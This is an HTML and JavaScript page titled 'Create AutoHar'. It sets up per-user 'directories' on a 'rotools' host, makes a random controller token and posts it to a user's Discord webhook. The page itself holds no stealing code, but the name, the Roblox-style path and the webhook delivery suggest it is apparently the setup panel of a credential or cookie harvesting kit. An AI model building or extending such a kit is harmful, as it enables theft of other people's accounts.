<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width,initial-scale=1.0"/>
  <title>Create AutoHar</title>
  <style>
    body { background:#16161d; min-height:100vh; margin:0; font-family:'Roboto',Arial,sans-serif; color:#fff; display:flex; align-items:center; justify-content:center; }
    .autohar-card { background:#20212b; border-radius:22px; box-shadow:0 8px 48px 0 rgba(34,255,215,0.11),0 2px 8px rgba(20,20,30,0.18); border:2.5px solid #49ffd7; padding:2.6rem 2.8rem 2.2rem 2.8rem; box-sizing:border-box; min-width:340px; max-width:420px; width:98vw; display:flex; flex-direction:column; align-items:stretch; position:relative; }
    .autohar-card h1 { margin:0 0 0.25em 0; font-size:2.35rem; font-family:'Orbitron',Arial,sans-serif; font-weight:900; text-align:center; color:#49ffd7; }
    .autohar-card p { text-align:center; color:#b7ffe2; font-size:1.13rem; margin-bottom:2.1em; margin-top:0.6em; }
    label { color:#e6fff6; font-size:1.09rem; margin-bottom:0.5em; margin-top:0.7em; font-weight:500; display:block; }
    .input-group { margin-bottom:1.05em; position:relative; }
    input[type="text"] { width:100%; padding:1em 1em 1em 1.1em; background:#191b23; border:1.6px solid #2de9c9; border-radius:10px; color:#e0fdfb; font-size:1.11rem; outline:none; box-sizing:border-box; margin-top:0.23em; margin-bottom:0.1em; }
    input[type="text"]:focus { border:2.2px solid #49ffd7; }
    .input-error { color:#f47b7b; font-size:0.99em; margin-top:0.14em; margin-bottom:-0.7em; min-height:1.3em; }
    .divider { margin:1.35em 0 1.15em 0; border:none; border-top:1px solid #353535; }
    .submit-btn { width:100%; padding:1em 0; border-radius:14px; background:linear-gradient(90deg,#5e7aff 0%,#3aeab7 100%); color:#fff; font-family:'Orbitron',Arial,sans-serif; font-size:1.23rem; font-weight:700; border:none; margin-top:0.7em; margin-bottom:0.3em; cursor:pointer; display:flex; align-items:center; justify-content:center; gap:0.5em; }
    .submit-btn:disabled { opacity:0.63; cursor:not-allowed; }
    .submit-btn .spinner { display:inline-block; margin-left:6px; width:1.15em; height:1.15em; border:2.5px solid #fff8; border-top:2.5px solid #fff; border-radius:50%; animation:spin 0.75s linear infinite; }
    @keyframes spin { to { transform: rotate(360deg); } }
    .modal-bg { position:fixed; top:0; left:0; width:100vw; height:100vh; background:rgba(0,0,0,0.50); display:flex; align-items:center; justify-content:center; z-index:100; }
    .modal { background:#232542; border-radius:13px; box-shadow:0 4px 32px rgba(0,0,0,0.32); padding:2.3rem 2.2rem 2rem 2.2rem; max-width:350px; width:90vw; box-sizing:border-box; text-align:center; }
    .modal .ok-btn { background:#8b6efd; color:#fff; font-weight:600; padding:0.56em 1.6em; border:none; border-radius:7px; font-size:1.01rem; cursor:pointer; }
    .embed-preview { background:#23272a; border-radius:8px; text-align:left; margin:1.3em 0; padding:1em 1.2em; color:#fff; }
    .embed-title { font-weight:bold; font-size:1.1em; color:#82bfff; margin-bottom:0.4em; }
    .embed-field { margin:0.3em 0; }
    .embed-field-label { color:#f9d923; font-size:0.98em; font-weight:600; display:block; margin-bottom:0.2em; }
    .embed-field-value { background:#18181b; border-radius:5px; padding:0.3em 0.7em; font-family:"Consolas","monospace"; color:#eee; font-size:0.99em; word-break:break-all; margin-bottom:0.5em; }
    .embed-link { color:#6ad2ff; text-decoration:underline; word-break:break-all; }
  </style>
</head>
<body>
  <div class="autohar-card">
    <h1>Create AutoHar</h1>
    <p>Fill out the form to create your AutoHar Site. Please use a unique Directory Name and a valid Discord webhook.</p>
    <form id="autohar-form" autocomplete="off">
      <div class="input-group">
        <label for="directory">Directory Name</label>
        <input type="text" id="directory" name="directory" placeholder="https://rotools/home/your_directory_here" required autocomplete="off" spellcheck="false"/>
        <div class="input-error" id="dir-error"></div>
      </div>
      <div class="input-group">
        <label for="webhook">Your Webhook</label>
        <input type="text" id="webhook" name="webhook" placeholder="https://discord.com/api/webhooks/..." required autocomplete="off" spellcheck="false"/>
        <div class="input-error" id="webhook-error"></div>
      </div>
      <hr class="divider" />
      <button type="submit" class="submit-btn" disabled>
        Create
        <span class="spinner"></span>
      </button>
    </form>
  </div>
  <div id="modal-bg" class="modal-bg" style="display:none;">
    <div class="modal" id="modal"></div>
  </div>
  <script>
    let usedDirectories = [];
    function isValidWebhook(url) {
      return /^https:\/\/discord\.com\/api\/webhooks\/\d+\/[\w-]+$/i.test(url.trim());
    }
    function generateToken() {
      const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
      let token = '';
      for (let i = 0; i < 32; i++) token += chars[Math.floor(Math.random() * chars.length)];
      return token;
    }
    const dirInput = document.getElementById('directory');
    const webhookInput = document.getElementById('webhook');
    const dirError = document.getElementById('dir-error');
    const webhookError = document.getElementById('webhook-error');
    const submitBtn = document.querySelector('.submit-btn');
    function checkInputs() {
      let valid = true;
      dirError.textContent = '';
      webhookError.textContent = '';
      if (!dirInput.value.trim()) valid = false;
      if (!webhookInput.value.trim()) valid = false;
      submitBtn.disabled = !valid;
    }
    dirInput.addEventListener('input', checkInputs);
    webhookInput.addEventListener('input', checkInputs);
    function showModal(title, message) {
      const modalBg = document.getElementById('modal-bg');
      const modal = document.getElementById('modal');
      modal.innerHTML = `<h2>${title}</h2><p>${message}</p><button class="ok-btn" onclick="closeModal();">OK</button>`;
      modalBg.style.display = 'flex';
    }
    function closeModal() {
      document.getElementById('modal-bg').style.display = 'none';
      setButtonState();
      submitBtn.disabled = false;
    }
    function showSuccessEmbed(token, controllerUrl) {
      const modalBg = document.getElementById('modal-bg');
      const modal = document.getElementById('modal');
      modal.innerHTML = `
        <h2>Successfully Created!</h2>
        <div class="embed-preview">
          <div class="embed-title">AutoHar â€“ Created <span style="background:#5865f2;border-radius:4px;color:#fff;padding:0 4px;font-size:0.78em;vertical-align:middle;">APP</span></div>
          <div class="embed-field">
            <span class="embed-field-label">ðŸ”— Controller:</span>
            <a class="embed-link" href="${controllerUrl}" target="_blank">Open Controller</a>
          </div>
          <div class="embed-field">
            <span class="embed-field-label">ðŸ”‘ Token:</span>
            <div class="embed-field-value" style="user-select:all;">${token}</div>
          </div>
        </div>
        <button class="ok-btn" onclick="closeModal();">OK</button>
      `;
      modalBg.style.display = 'flex';
    }
    function setButtonState(state) {
      if (state === 'spinner') {
        submitBtn.innerHTML = `Create <span class="spinner"></span>`;
      } else {
        submitBtn.innerHTML = `Create`;
      }
    }
    document.getElementById('autohar-form').addEventListener('submit', async function(e) {
      e.preventDefault();
      submitBtn.disabled = true;
      setButtonState('spinner');
      dirError.textContent = '';
      webhookError.textContent = '';
      const directory = dirInput.value.trim();
      const webhook = webhookInput.value.trim();
      await new Promise(r => setTimeout(r, 500));
      let error = false;
      if (usedDirectories.includes(directory)) {
        dirError.textContent = "Directory exists, try a different name.";
        setButtonState();
        submitBtn.disabled = false;
        error = true;
      }
      if (!isValidWebhook(webhook)) {
        webhookError.textContent = "Invalid webhook URL.";
        setButtonState();
        submitBtn.disabled = false;
        error = true;
      }
      if (error) return;
      usedDirectories.push(directory);
      const token = generateToken();
      // Generate correct controller URL for GitHub Pages (or any host)
      const controllerUrl = `${window.location.origin}${window.location.pathname.replace(/\/[^/]*$/, '')}/controller.html?token=${encodeURIComponent(token)}`;
      try {
        const res = await fetch(webhook, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            username: "AutoHar â€“ Created",
            embeds: [{
              title: "Successfully Created!",
              color: 0x77e29b,
              description: `ðŸ”— [Controller](${controllerUrl})\n\nðŸ”‘ **Token:**\n\`\`\`${token}\`\`\``,
              footer: { text: "AutoHar â€“ Created" }
            }]
          })
        });
        if (!res.ok) throw new Error("Webhook error");
        setButtonState();
        showSuccessEmbed(token, controllerUrl);
      } catch (err) {
        setButtonState();
        showModal('Error', 'Failed to send to Discord webhook.');
        submitBtn.disabled = false;
      }
    });
  </script>
</body>
</html>
